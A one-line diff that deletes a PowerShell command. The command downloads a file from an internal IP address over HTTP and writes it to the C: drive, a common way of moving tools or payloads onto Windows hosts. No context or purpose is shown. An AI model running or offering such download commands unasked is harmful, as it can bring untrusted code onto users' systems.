@@ -1,1 +1,0 @@
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.13.112/blah.txt','c:\test.txt')"
